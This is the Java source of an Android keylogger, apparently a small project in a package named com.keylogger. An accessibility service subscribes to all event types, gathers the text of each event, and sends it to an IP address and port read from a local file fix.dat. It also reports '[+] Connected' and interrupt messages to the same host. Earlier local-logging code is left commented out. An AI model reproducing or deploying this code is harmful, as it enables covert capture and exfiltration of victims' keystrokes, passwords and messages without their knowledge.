package com.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
//import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityRecord;
import android.widget.*;
import java.io.*;
import java.net.*;

public class MyAccessibilityService extends AccessibilityService {
	
	public void send(String s1){
		if (ip==null){
		String[] l1=get1();
		ip=l1[0];
		port=l1[1];
		
		}
		if (ip!="none" || port!="none"){
			MessageSender messageSender = new MessageSender();
			messageSender.execute(s1,ip,port);
		}
		
		}
	public String[] get1(){
		File file =new File(getExternalFilesDir("key"),"fix.dat");
		String[] none ={"none","none"};
		if (file.exists()){
			StringBuilder sb =new StringBuilder();
			try
			{	FileReader fr= new FileReader(file);
				BufferedReader br=new BufferedReader(fr);
				String[] lis = br.readLine().split(":");
				if (lis[0] != null)
				{
					return lis;
				}else{
					return none;
				}
			}
			catch (IOException e)
			{
				Toast.makeText(this,e.toString(),Toast.LENGTH_SHORT);
				return none;
			}
		}
		return none;
	}
		
		static final String TAG = "RecorderService";
		String ip=null;
		String port;
		/*private String getEventType(AccessibilityEvent event) {
				//Toast.makeText(this,"clicked",Toast.LENGTH_LONG);
			switch (event.getEventType()) {
						case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
							return "TYPE_NOTIFICATION_STATE_CHANGED";
						case AccessibilityEvent.TYPE_VIEW_CLICKED:
							return "TYPE_VIEW_CLICKED";
						case AccessibilityEvent.TYPE_VIEW_FOCUSED:
							return "TYPE_VIEW_FOCUSED";
						case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
							return "TYPE_VIEW_LONG_CLICKED";
						case AccessibilityEvent.TYPE_VIEW_SELECTED:
							return "TYPE_VIEW_SELECTED";
						case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
							return "TYPE_WINDOW_STATE_CHANGED";
						case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
							return "TYPE_VIEW_TEXT_CHANGED";
					}
				return "default";
			}
			*/

		private String getEventText(AccessibilityEvent event) {
				StringBuilder sb = new StringBuilder();
				for (CharSequence s : event.getText()) {
						sb.append(s);
						
					}
				return sb.toString();
			}

		@Override
			public void onAccessibilityEvent(AccessibilityEvent event) {
			String l1=getEventText(event);
				if (!(l1=="")){
					send(l1);
					//Log.v(TAG,String.format("Text => %s",l1));
					
					/*File f1 = new File(getExternalFilesDir("key"),"log.txt");
					FileOutputStream fos;
					try{
							fos = new FileOutputStream(f1,true);
							fos.write(l1.concat("\n").getBytes());
						} catch (IOException e) {
							System.out.println("An error occurred.");
							e.printStackTrace();
						}*/
			}
				
						
				
			
			}

		@Override
		public void onInterrupt() {
				//Log.v(TAG, "onInterrupt");
				/*File f1 = new File(getExternalFilesDir("key"),"log.txt");
				FileOutputStream fos;
				try{
						fos = new FileOutputStream(f1,true);
						fos.write("Interrupted !!!".concat("\n").getBytes());
					} catch (IOException e) {
						System.out.println("An error occurred.");
						e.printStackTrace();
					}*/
					send("[-] Interrupted !!! ");
			}

		@Override
		protected void onServiceConnected() {
				super.onServiceConnected();
				
				//Log.v(TAG, "onServiceConnected");
				/*File f1 = new File(getExternalFilesDir("key"),"log.txt");
				FileOutputStream fos;
				try{
						fos = new FileOutputStream(f1,true);
						fos.write("Connected".concat("\n").getBytes());
					} catch (IOException e) {
						System.out.println("An error occurred.");
						e.printStackTrace();
					}*/
				send("[+] Connected");
				AccessibilityServiceInfo info = new AccessibilityServiceInfo();
				info.flags = AccessibilityServiceInfo.DEFAULT;
				info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
				info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
				setServiceInfo(info);
			}

	}
	
